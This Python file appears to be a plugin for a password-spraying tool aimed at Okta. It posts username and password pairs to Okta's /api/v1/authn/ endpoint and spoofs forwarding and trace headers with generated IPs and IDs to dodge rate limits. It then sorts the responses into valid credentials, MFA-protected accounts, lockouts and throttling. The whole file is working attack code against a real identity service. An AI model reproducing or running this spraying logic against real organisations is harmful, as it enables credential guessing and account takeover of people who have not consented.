import json, requests
import utils.utils as utils

def okta_authenticate(url, username, password, useragent, pluginargs):

    data_response = {
        'result': None,    # Can be "success", "failure" or "potential"
        'error': False,
        'output' : "",
        'valid_user' : False
    }

    raw_body = "{\"username\":\"%s\",\"password\":\"%s\",\"options\":{\"warnBeforePasswordExpired\":true,\"multiOptionalFactorEnroll\":true}}" % (username, password)

    spoofed_ip = utils.generate_ip()
    amazon_id = utils.generate_id()
    trace_id = utils.generate_trace_id()

    headers = {
            'User-Agent': useragent,
            "X-My-X-Forwarded-For" : spoofed_ip,
            "x-amzn-apigateway-api-id" : amazon_id,
            "X-My-X-Amzn-Trace-Id" : trace_id,

            'Content-Type': 'application/json'
    }

    headers = utils.add_custom_headers(pluginargs, headers)

    try:
        resp = requests.post("{}/api/v1/authn/".format(url),data=raw_body,headers=headers)

        if resp.status_code == 200:
            resp_json = json.loads(resp.text)

            if resp_json.get("status") == "LOCKED_OUT": #Warning: administrators can configure Okta to not indicate that an account is locked out. Fair warning ;)
                data_response['result'] = "failure"
                data_response['output'] ='[-] FAILURE: Locked out {}:{}'.format(username, password)
                data_response['valid_user'] = True

            elif resp_json.get("status") == "SUCCESS":
                data_response['result'] = "success"
                data_response['output'] = '[+] SUCCESS: => {}:{}'.format(username, password)
                data_response['valid_user'] = True

            elif resp_json.get("status") == "MFA_REQUIRED":
                data_response['result'] = "success"
                data_response['output'] = "[+] SUCCESS: 2FA => {}:{}".format(username,password)
                data_response['valid_user'] = True

            elif resp_json.get("status") == "PASSWORD_EXPIRED":
                data_response['result'] = "success"
                data_response['output'] = "[+] SUCCESS: password expired {}:{}".format(username,password)
                data_response['valid_user'] = True

            elif resp_json.get("status") == "MFA_ENROLL":
                data_response['result'] = "success"
                data_response['output'] = "[+] SUCCESS: MFA enrollment required {}:{}".format(username,password)
                data_response['valid_user'] = True

            else:
                data_response['result'] = "failure"
                data_response['output'] = "[?] ALERT: 200 but doesn't indicate success {}:{}".format(username,password)

        elif resp.status_code == 403:
                data_response['result'] = "failure"
                data_response['output'] = "[-] FAILURE THROTTLE INDICATED: {} => {}:{}".format(resp.status_code, username, password)

        else:
            data_response['result'] = "failure"
            data_response['output'] = "[-] FAILURE: {} => {}:{}".format(resp.status_code, username, password)


    except Exception as ex:
        data_response['error'] = True
        data_response['output'] = ex
        pass

    return data_response
